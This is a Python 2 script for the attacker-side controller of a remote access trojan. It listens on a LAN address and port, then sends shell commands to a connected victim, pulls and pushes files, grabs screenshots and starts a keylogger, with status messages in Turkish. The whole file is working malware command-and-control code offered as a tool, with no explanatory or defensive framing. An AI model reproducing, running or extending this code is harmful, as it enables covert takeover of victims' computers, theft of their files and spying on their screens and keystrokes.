#!/usr/bin/python

import socket
import json
import base64

count = 1

def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data)

def reliable_recv():
	data = ""
	while True:
		try:
			data = data + target.recv(1024)
			return json.loads(data)
		except ValueError:
			continue


def shell():
	global count
	while True:
		command = raw_input("Shell#~%s:" %(str(ip)))
		reliable_send(command)
		if command == "q":
			break

		elif command[:2] == "cd" and len(command) > 1:
			continue


		elif command[:8] == "download":
			with open(command[9:],'wb') as file:
				file_data = reliable_recv()
				file.write(base64.b64decode(file_data))
				file.close()
		elif command[:6] == "upload":
			with open(command[7:],"rb") as fin:
				try:
					reliable_send(base64.b64encode(fin.read()))
					fin.close()
				except:
					err = "Failed to upload"
					reliable_send(base64.b64encode(err))

		elif command[:10] == "screenshot":
			with open("screenshot%d" % count,"wb") as screen:
				image = reliable_recv()
				image_decoded = base64.b64decode(image)
				if image_decoded[:4] == "[!!]":
					print(image_decoded)
				else:
					screen.write(image_decoded)
					count += 1

		elif command[:12] == "keylog_start":
			continue

		else:
			result = reliable_recv()
			print(result)

def server():

	global s
	global target
	global ip

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

	s.bind(("192.168.1.106",17700))
	s.listen(5)

	print("[+] Gelen baglantilar dinleniyor...")

	target,ip = s.accept()

	print("[+] Baglanti saglayan IP adresi: %s" %(str(ip)))



server()
shell()
s.close()

